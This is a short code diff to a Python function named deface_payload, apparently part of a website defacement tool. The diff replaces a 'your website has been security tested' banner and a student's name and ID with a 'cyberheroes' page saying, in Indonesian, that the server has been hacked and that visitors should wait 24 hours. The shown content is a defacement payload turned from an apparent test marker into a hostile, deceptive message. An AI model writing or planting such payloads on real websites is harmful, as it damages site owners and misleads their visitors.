@@ -145,7 +145,7 @@ def deface_payload(url, session, backup_file_path):
     payload = """
     <html>
         <head>
-            <title>Website Anda Telah Diuji Keamanan</title>
+            <title>cyberheroes</title>
             <style>
                 body {
                     background: linear-gradient(45deg, #1E90FF, #00BFFF, #87CEFA);
@@ -169,9 +169,9 @@ def deface_payload(url, session, backup_file_path):
             </style>
         </head>
         <body>
-            <h1>Andi Muh Zhaldy</h1>
-            <p>No : 4</p>
-            <p>NIT : 1112083</p>
+            <h1>cyberheroes</h1>
+            <p>server telah di hack</p>
+            <p>server errror,tunggu 24jam</p>
         </body>
     </html>
     """
